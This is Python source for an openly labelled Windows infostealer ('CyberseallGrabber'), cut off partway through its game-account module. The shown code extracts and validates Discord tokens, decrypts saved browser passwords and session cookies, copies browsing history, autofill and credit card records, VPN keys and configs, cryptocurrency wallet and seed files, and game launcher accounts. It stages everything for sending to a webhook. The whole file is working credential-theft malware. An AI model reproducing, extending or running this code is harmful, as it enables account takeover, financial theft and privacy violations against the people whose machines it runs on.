import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.v = []
        self.ga = []
        self.h = []
        self.af = []
        self.di = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.history()
        self.autofill()
        self.fi()
        self.vpn()
        self.games()
        self.discord_inject()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            def getip():
                ip = "None"
                try:
                    import urllib.request
                    ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
                except: 
                    pass
                return ip
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
            
            for i in tokens:
                if i.endswith("\\"):
                    i = i.replace("\\", "")
                if i not in cleaned:
                    cleaned.append(i)
            
            for token in cleaned:
                try:
                    tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                    if tok != "Error":
                        checker.append(tok)
                except:
                    continue
            
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': value, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                        if res.status_code == 200:
                            self.t.append(value)
                    except:
                        pass
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                
                if res.status_code == 200:
                    res_json = res.json()
                    
                    try:
                        import urllib.request
                        ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
                    except:
                        ip = "None"
                    
                    pc_username = os.getenv("UserName", "Unknown")
                    pc_name = os.getenv("Computername", "Unknown")
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    user_id = res_json['id']
                    email = res_json['email']
                    phone = res_json['phone']
                    mfa_enabled = res_json['mfa_enabled']
                    
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': res_json.get('username', 'Unknown'),
                        'discriminator': res_json.get('discriminator', '0000'),
                        'id': user_id,
                        'email': email,
                        'phone': phone,
                        'verified': res_json.get('verified', False),
                        'mfa_enabled': mfa_enabled,
                        'premium_type': res_json.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left,
                        'ip': ip,
                        'pc_username': pc_username,
                        'pc_name': pc_name,
                        'user_name': user_name,
                        'platform': 'Discord'
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 3:
                        return "Failed to decrypt"


                    try:
                        if password[:3] == b'v10' or password[:3] == b'v11':
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except:
                        pass


                    try:
                        if len(password) >= 15:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except:
                        pass


                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                            if decrypted and len(decrypted) > 0:
                                return decrypted
                    except:
                        pass


                    try:
                        for iv_start in [3, 0, 12]:
                            for iv_len in [12, 16, 8]:
                                if len(password) >= iv_start + iv_len + 16:
                                    iv = password[iv_start:iv_start + iv_len]
                                    encrypted_data = password[iv_start + iv_len:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                    if decrypted_pass and len(decrypted_pass) > 0:
                                        return decrypted_pass
                    except:
                        pass


                    try:
                        if isinstance(password, bytes) and len(password) > 10:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 3:
                                return f"Partial: {printable_chars[:50]}"
                    except:
                        pass

                    return "Failed to decrypt"
                except:
                    return "Failed to decrypt"
            
            def get_browser_passwords():
                passwords = []
                

                simple_browsers = []
                

                chrome_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data")
                ]
                
                for chrome_base in chrome_paths:
                    if os.path.exists(chrome_base):
                        for profile in ["Default", "Profile 1", "Profile 2"]:
                            profile_path = os.path.join(chrome_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Chrome-{profile}",
                                    "path": profile_path,
                                    "base_path": chrome_base,
                                    "login_file": "Login Data"
                                })
                

                edge_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data")
                ]
                
                for edge_base in edge_paths:
                    if os.path.exists(edge_base):
                        for profile in ["Default", "Profile 1"]:
                            profile_path = os.path.join(edge_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Edge-{profile}",
                                    "path": profile_path,
                                    "base_path": edge_base,
                                    "login_file": "Login Data"
                                })
                

                brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                if os.path.exists(brave_base):
                    for profile in ["Default", "Profile 1"]:
                        profile_path = os.path.join(brave_base, profile)
                        if os.path.exists(profile_path):
                            simple_browsers.append({
                                "name": f"Brave-{profile}",
                                "path": profile_path,
                                "base_path": brave_base,
                                "login_file": "Login Data"
                            })
                

                opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
                if os.path.exists(opera_base):
                    simple_browsers.append({
                        "name": "Opera",
                        "path": opera_base,
                        "base_path": opera_base,
                        "login_file": "Login Data"
                    })

                for browser_info in simple_browsers:
                    try:
                        browser_name = browser_info["name"]
                        profile_path = browser_info["path"]
                        base_path = browser_info.get("base_path", profile_path)
                        login_file = browser_info["login_file"]

                        if not os.path.exists(profile_path):
                            continue

                        login_db_path = os.path.join(profile_path, login_file)
                        if not os.path.exists(login_db_path):
                            continue


                        state_file = os.path.join(base_path, "Local State")
                        if not os.path.exists(state_file):

                            state_file = os.path.join(profile_path, "Local State")
                            if not os.path.exists(state_file):
                                continue


                        try:
                            with open(state_file, "r", encoding="utf-8") as f:
                                local_state = json.loads(f.read())
                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                master_key = base64.b64decode(encrypted_key)[5:]
                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                        except:
                            continue


                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                        try:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                            shutil.copy2(login_db_path, temp_db)
                        except:
                            continue


                        try:
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            login_data = cursor.fetchall()

                            for row in login_data:
                                if len(row) >= 3 and row[0] and row[1] and row[2]:
                                    url, username, encrypted_password = row[0], row[1], row[2]
                                    
                                    decrypted_password = None
                                    

                                    try:
                                        decrypted_password = decrypt_password(encrypted_password, master_key)
                                    except:
                                        pass
                                    

                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            result = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                                            if result and result[1]:
                                                decrypted_password = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                                        except:
                                            pass
                                    

                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
                                                if len(readable) > 3:
                                                    decrypted_password = f"Partial: {readable[:30]}"
                                        except:
                                            pass
                                    

                                    if decrypted_password and decrypted_password != "Failed to decrypt":
                                        passwords.append({
                                            "browser": browser_name,
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password,
                                            "times_used": 0,
                                            "date_created": 0
                                        })

                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                        except:
                            pass

                    except:
                        pass

                return passwords
            

            def extract_valuable_cookies():
                valuable_cookies = []
                

                browsers = {
                    'Chrome': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                        'profiles': ["Default", "Profile 1", "Profile 2"]
                    },
                    'Edge': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                        'profiles': ["Default", "Profile 1"]
                    },
                    'Brave': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
                        'profiles': ["Default", "Profile 1"]
                    }
                }
                
                for browser_name, browser_info in browsers.items():
                    base_path = browser_info['base']
                    if not os.path.exists(base_path):
                        continue
                    

                    state_file = os.path.join(base_path, "Local State")
                    if not os.path.exists(state_file):
                        continue
                    
                    try:
                        with open(state_file, "r", encoding="utf-8") as f:
                            local_state = json.loads(f.read())
                            encrypted_key = local_state["os_crypt"]["encrypted_key"]
                            master_key = base64.b64decode(encrypted_key)[5:]
                            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    except:
                        continue
                    

                    for profile in browser_info['profiles']:
                        profile_path = os.path.join(base_path, profile)
                        cookies_path = os.path.join(profile_path, "Cookies")
                        
                        if not os.path.exists(cookies_path):
                            continue
                        
                        try:

                            temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_cookies.db")
                            if os.path.exists(temp_cookies_db):
                                os.remove(temp_cookies_db)
                            
                            shutil.copy2(cookies_path, temp_cookies_db)
                            
                            conn = sqlite3.connect(temp_cookies_db)
                            cursor = conn.cursor()
                            

                            valuable_domains = ['discord.com', 'facebook.com', 'twitter.com', 'instagram.com', 'github.com', 'google.com']
                            
                            for domain in valuable_domains:
                                try:
                                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ? LIMIT 3", (f'%{domain}%',))
                                    cookies = cursor.fetchall()
                                    
                                    for cookie in cookies:
                                        if cookie[2]:
                                            try:
                                                decrypted_value = decrypt_password(cookie[2], master_key)
                                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
                                                    valuable_cookies.append({
                                                        "browser": f"{browser_name}-{profile}",
                                                        "url": f"COOKIE_{domain}",
                                                        "username": cookie[1],
                                                        "password": decrypted_value[:50],
                                                        "times_used": 0,
                                                        "date_created": 0
                                                    })
                                            except:
                                                pass
                                except:
                                    pass
                            
                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_cookies_db)
                            except:
                                pass
                                
                        except:
                            pass
                
                return valuable_cookies
            

            password_data = get_browser_passwords()
            cookie_data = extract_valuable_cookies()
            

            all_data = password_data + cookie_data
            

            pw_data = []
            for pwd in all_data:
                if pwd.get('times_used', 0) > 0:
                    usage_info = f" | Used: {pwd['times_used']}x"
                else:
                    usage_info = ""
                
                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
                pw_data.append(password_entry)
            

            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER PASSWORD STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n{browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except:
                    pass
            
        except:
            pass

    def history(self):
        try:
            history_data = []
            

            browsers = {
                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
                'Chrome-Profile1': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "History"),
                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History"),
                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
                'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
            }
            
            for browser_name, history_path in browsers.items():
                if os.path.exists(history_path):
                    try:

                        temp_history_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_history.db")
                        if os.path.exists(temp_history_db):
                            os.remove(temp_history_db)
                        
                        shutil.copy2(history_path, temp_history_db)
                        
                        conn = sqlite3.connect(temp_history_db)
                        cursor = conn.cursor()
                        

                        cursor.execute("""
                            SELECT url, title, visit_count, last_visit_time 
                            FROM urls 
                            ORDER BY last_visit_time DESC 
                            LIMIT 100
                        """)
                        
                        history_entries = cursor.fetchall()
                        
                        for entry in history_entries:
                            if entry[0] and len(entry[0]) > 10:
                                url = entry[0]
                                title = entry[1] if entry[1] else "No Title"
                                visit_count = entry[2] if entry[2] else 0
                                

                                try:
                                    if entry[3]:

                                        chrome_time = entry[3] / 1000000.0
                                        unix_time = chrome_time - 11644473600
                                        if unix_time > 0:
                                            visit_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(unix_time))
                                        else:
                                            visit_time = "Unknown"
                                    else:
                                        visit_time = "Unknown"
                                except:
                                    visit_time = "Unknown"
                                
                                history_entry = f"HISTORY_{browser_name} | {url} | {title} | Visits: {visit_count} | Last: {visit_time}"
                                history_data.append(history_entry)
                        
                        cursor.close()
                        conn.close()
                        
                        try:
                            os.remove(temp_history_db)
                        except:
                            pass
                            
                    except:
                        pass
            
            self.h = history_data
            

            if history_data:
                try:
                    with open(os.path.join(self.d, "browser_history.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER HISTORY STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        browser_groups = {}
                        for history_entry in history_data:
                            browser = history_entry.split(" |")[0].replace("HISTORY_", "")
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(history_entry)
                        
                        for browser, entries in browser_groups.items():
                            f.write(f"\n{browser.upper()} HISTORY ({len(entries)} entries)\n")
                            f.write("-" * 50 + "\n")
                            for entry in entries:
                                f.write(entry + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL HISTORY ENTRIES: {len(history_data)}\n")
                        f.write("=" * 60 + "\n")
                except:
                    pass
        except:
            pass

    def autofill(self):
        try:
            autofill_data = []
            

            browsers = {
                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data"),
                'Chrome-Profile1': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "Web Data"),
                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Web Data"),
                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data"),
                'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
            }
            
            for browser_name, webdata_path in browsers.items():
                if os.path.exists(webdata_path):
                    try:

                        temp_webdata_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_webdata.db")
                        if os.path.exists(temp_webdata_db):
                            os.remove(temp_webdata_db)
                        
                        shutil.copy2(webdata_path, temp_webdata_db)
                        
                        conn = sqlite3.connect(temp_webdata_db)
                        cursor = conn.cursor()
                        

                        try:
                            cursor.execute("""
                                SELECT guid, company_name, street_address, city, state, zipcode, 
                                       country_code, number, email, language_code
                                FROM autofill_profiles 
                                LIMIT 20
                            """)
                            
                            profiles = cursor.fetchall()
                            
                            for profile in profiles:
                                if any(profile[1:]):
                                    profile_info = f"AUTOFILL_DATA_{browser_name} | Company: {profile[1] or 'N/A'} | Address: {profile[2] or 'N/A'} | City: {profile[3] or 'N/A'} | State: {profile[4] or 'N/A'} | ZIP: {profile[5] or 'N/A'} | Country: {profile[6] or 'N/A'} | Phone: {profile[7] or 'N/A'} | Email: {profile[8] or 'N/A'}"
                                    autofill_data.append(profile_info)
                        except:
                            pass
                        

                        try:
                            cursor.execute("""
                                SELECT guid, name_on_card, expiration_month, expiration_year, 
                                       card_number_encrypted, date_modified
                                FROM credit_cards 
                                LIMIT 10
                            """)
                            
                            cards = cursor.fetchall()
                            
                            for card in cards:
                                if card[1] or card[4]:
                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: [ENCRYPTED] | Modified: {card[5] or 'N/A'}"
                                    autofill_data.append(card_info)
                        except:
                            pass
                        
                        cursor.close()
                        conn.close()
                        
                        try:
                            os.remove(temp_webdata_db)
                        except:
                            pass
                            
                    except:
                        pass
            
            self.af = autofill_data
            

            if autofill_data:
                try:
                    with open(os.path.join(self.d, "autofill_data.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER AUTOFILL & CREDIT CARD STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        autofill_profiles = [item for item in autofill_data if item.startswith("AUTOFILL_DATA")]
                        credit_cards = [item for item in autofill_data if item.startswith("CREDIT_CARD")]
                        
                        if autofill_profiles:
                            f.write(f"AUTOFILL PROFILES ({len(autofill_profiles)} found)\n")
                            f.write("-" * 50 + "\n")
                            for profile in autofill_profiles:
                                f.write(profile + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write(f"CREDIT CARDS ({len(credit_cards)} found)\n")
                            f.write("-" * 50 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL AUTOFILL ENTRIES: {len(autofill_data)}\n")
                        f.write("=" * 60 + "\n")
                except:
                    pass
        except:
            pass

    def vpn(self):
        try:
            vpn_data = []
            

            vpn_paths = {
                'OpenVPN Connect': os.path.join(os.getenv("APPDATA"), "OpenVPN Connect", "profiles"),
                'Mullvad VPN': os.path.join(os.getenv("APPDATA"), "Mullvad VPN"),
                'Proton VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ProtonVPN"),
                'Nord VPN': os.path.join(os.getenv("LOCALAPPDATA"), "NordVPN"),
                'Express VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ExpressVPN"),
                'CyberGhost': os.path.join(os.getenv("LOCALAPPDATA"), "CyberGhost"),
                'Surfshark': os.path.join(os.getenv("LOCALAPPDATA"), "Surfshark"),
                'Vypr VPN': os.path.join(os.getenv("LOCALAPPDATA"), "VyprVPN"),
                'Windscribe': os.path.join(os.getenv("LOCALAPPDATA"), "Windscribe"),
                'Hide.me': os.path.join(os.getenv("LOCALAPPDATA"), "hide.me VPN"),
                'Hotspot Shield': os.path.join(os.getenv("LOCALAPPDATA"), "Hotspot Shield"),
                'TunnelBear': os.path.join(os.getenv("LOCALAPPDATA"), "TunnelBear"),
                'IPVanish': os.path.join(os.getenv("LOCALAPPDATA"), "IPVanish"),
                'HMA VPN': os.path.join(os.getenv("LOCALAPPDATA"), "HMA VPN"),
                'ZenMate': os.path.join(os.getenv("LOCALAPPDATA"), "ZenMate"),
                'Pure VPN': os.path.join(os.getenv("LOCALAPPDATA"), "PureVPN"),
                'TorGuard': os.path.join(os.getenv("LOCALAPPDATA"), "TorGuard"),
                'Betternet': os.path.join(os.getenv("LOCALAPPDATA"), "Betternet"),
                'PrivateVPN': os.path.join(os.getenv("LOCALAPPDATA"), "PrivateVPN"),
                'VPN Unlimited': os.path.join(os.getenv("LOCALAPPDATA"), "VPN Unlimited"),
                'Goose VPN': os.path.join(os.getenv("LOCALAPPDATA"), "GooseVPN"),
                'SaferVPN': os.path.join(os.getenv("LOCALAPPDATA"), "SaferVPN"),
                'Private Internet Access': os.path.join(os.getenv("LOCALAPPDATA"), "Private Internet Access"),
                'SoftEther VPN': os.path.join("C:", "Program Files", "SoftEther VPN Client")
            }
            
            for vpn_name, vpn_path in vpn_paths.items():
                if os.path.exists(vpn_path):
                    try:

                        vpn_dest = os.path.join(self.d, f"vpn_{vpn_name.replace(' ', '_')}")
                        if not os.path.exists(vpn_dest):
                            os.makedirs(vpn_dest)
                        

                        for root, dirs, files in os.walk(vpn_path):
                            for file in files[:20]:
                                if file.lower().endswith(('.ovpn', '.conf', '.config', '.json', '.xml', '.dat', '.key', '.crt', '.pem')):
                                    try:
                                        src_file = os.path.join(root, file)
                                        if os.path.getsize(src_file) < 10*1024*1024:
                                            dest_file = os.path.join(vpn_dest, file)
                                            shutil.copy2(src_file, dest_file)
                                    except:
                                        pass
                        

                        if os.path.exists(vpn_dest) and os.listdir(vpn_dest):
                            vpn_data.append(f"{vpn_name}: {len(os.listdir(vpn_dest))} files")
                        else:
                            try:
                                os.rmdir(vpn_dest)
                            except:
                                pass
                    except:
                        pass
            
            self.v = vpn_data
            

            if vpn_data:
                try:
                    with open(os.path.join(self.d, "vpn_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("VPN STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for vpn_info in vpn_data:
                            f.write(f"{vpn_info}\n")
                        f.write(f"\nTotal VPNs found: {len(vpn_data)}\n")
                except:
                    pass
        except:
            pass

    def fi(self):
        try:
            files_data = []
            

            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            

            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def games(self):
        try:
            game_data = []
            

            game_paths = {
                'Steam': {
                    'config': os.path.join("C:", "Program Files (x86)", "Steam", "config"),
                    'userdata': os.path.join("C:", "Program Files (x86)", "Steam", "userdata")
                },
                'Minecraft': {
                    'launcher_accounts': os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts_microsoft_store.json"),
                    'tlauncher': os.path.join(os.getenv("APPDATA"), ".minecraft", "TlauncherProfiles.json"),
                    'badlion': os.path.join(os.getenv("APPDATA"), "Badlion Client", "accounts.json"),
                    'lunar': os.path.join(os.getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
                    'feather': os.path.join(os.getenv("APPDATA"), ".feather", "accounts.json"),
                    'impact': os.path.join(os.getenv("APPDATA"), ".minecraft", "Impact", "alts.json"),
                    'meteor': os.path.join(os.getenv("APPDATA"), ".minecraft", "meteor-client", "accounts.nbt"),
                    'polymc': os.path.join(os.getenv("APPDATA"), "PolyMC", "accounts.json"),
                    'rise': os.path.join(os.getenv("APPDATA"), ".minecraft", "Rise", "alts.txt"),
                    'novoline': os.path.join(os.getenv("APPDATA"), ".minecraft", "Novoline", "alts.novo"),
                    'paladium': os.path.join(os.getenv("APPDATA"), "paladium-group", "accounts.json")
                },
                'Riot Games': {
                    'config': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Config"),
                    'data': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data"),
                    'logs': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Logs")
                },
                'Epic Games': {
                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
                },
                'Uplay': {
